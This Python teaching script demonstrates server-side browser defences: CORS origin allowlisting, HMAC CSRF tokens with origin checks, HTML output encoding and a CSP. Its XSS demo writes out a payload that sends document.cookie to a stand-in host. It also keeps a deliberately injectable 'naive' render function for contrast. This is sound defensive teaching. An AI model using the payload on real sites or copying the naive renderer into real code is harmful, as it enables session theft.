#!/usr/bin/env python3
"""
The server-side defenses for the browser trust boundary: CORS, CSRF, and XSS.

Companion to docs/en.md (Phase 07, Lesson 10). What it makes concrete:

  * CORS: reflect only ALLOWLISTED origins — never `Access-Control-Allow-Origin: *`
    with credentials (browsers refuse it, and it opens your API to any site).
    CORS governs who may READ a response in a browser; it is not server-side
    access control.
  * CSRF: a state-changing request must carry an unforgeable token the attacker
    can't read (the Same-Origin Policy blocks reading your pages), plus an
    Origin check. SameSite cookies (Lesson 5) are the other half.
  * XSS: the root cause is untrusted data interpreted as code. The primary fix
    is context-aware OUTPUT ENCODING (html.escape) so data stays data; a
    Content-Security-Policy is the safety net.

Stdlib only:  python3 browser_security.py
"""

from __future__ import annotations

import hashlib
import hmac
import html


ALLOWED_ORIGINS = {"https://app.acme.com", "https://admin.acme.com"}


# ── CORS ─────────────────────────────────────────────────────────────────────

def cors_headers(request_origin: str) -> dict:
    if request_origin in ALLOWED_ORIGINS:            # reflect only known origins — never "*"
        return {"Access-Control-Allow-Origin": request_origin,
                "Access-Control-Allow-Credentials": "true",
                "Vary": "Origin"}                    # so shared caches don't mix origins
    return {}                                         # unknown origin: no CORS grant


# ── CSRF ─────────────────────────────────────────────────────────────────────

def issue_csrf(session_id: str, key: bytes) -> str:
    return hmac.new(key, session_id.encode(), hashlib.sha256).hexdigest()   # bound to the session


def check_csrf(request_token: str, session_id: str, key: bytes, origin: str) -> bool:
    if origin not in ALLOWED_ORIGINS:                # reject cross-site state changes
        return False
    expected = issue_csrf(session_id, key)
    return hmac.compare_digest(request_token, expected)   # constant-time


# ── XSS: output encoding ─────────────────────────────────────────────────────

def render_comment_safe(text: str) -> str:
    return f"<div class='comment'>{html.escape(text)}</div>"   # data stays data


def render_comment_naive(text: str) -> str:
    return f"<div class='comment'>{text}</div>"                # data becomes code — XSS


CSP = "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'"


# ── Demos ────────────────────────────────────────────────────────────────────

def demo_cors() -> None:
    print("== 1 · CORS: ALLOWLIST, NEVER `*` WITH CREDENTIALS ==")
    h = cors_headers("https://app.acme.com")
    print(f"  Origin https://app.acme.com  -> Access-Control-Allow-Origin: "
          f"{h['Access-Control-Allow-Origin']} (+ Vary: Origin)")
    print(f"  Origin https://evil.com      -> "
          f"{cors_headers('https://evil.com') or '(no CORS headers)'} — not on the allowlist")
    print("  note: `Access-Control-Allow-Origin: *` with credentials is refused by browsers, and opens your API")


def demo_csrf() -> None:
    print("\n== 2 · CSRF TOKEN + ORIGIN CHECK ==")
    key, sid = b"csrf-signing-key", "sess_alice"
    token = issue_csrf(sid, key)
    print(f"  legit POST (correct token, own origin)     -> "
          f"{'accepted' if check_csrf(token, sid, key, 'https://app.acme.com') else 'rejected'}")
    print(f"  forged POST (no/wrong token)               -> "
          f"{'accepted' if check_csrf('wrong', sid, key, 'https://app.acme.com') else 'rejected'}  ✓")
    print(f"  forged POST (evil.com origin)              -> "
          f"{'accepted' if check_csrf(token, sid, key, 'https://evil.com') else 'rejected'}  ✓")


def demo_xss() -> None:
    print("\n== 3 · XSS: OUTPUT ENCODING MAKES DATA INERT ==")
    payload = "<script>fetch('//evil.com?c='+document.cookie)</script>"
    print(f"  payload: {payload}")
    print(f"  naive render : {render_comment_naive(payload)}")
    print(f"  safe render  : {render_comment_safe(payload)}")
    print("  the safe version shows the text; the browser never executes it")


def demo_csp() -> None:
    print("\n== 4 · CSP AS A SAFETY NET ==")
    print(f"  Content-Security-Policy: {CSP}")
    print("  even an injected <script> won't run: inline and cross-origin scripts are blocked")


def main() -> None:
    demo_cors()
    demo_csrf()
    demo_xss()
    demo_csp()


if __name__ == "__main__":
    main()
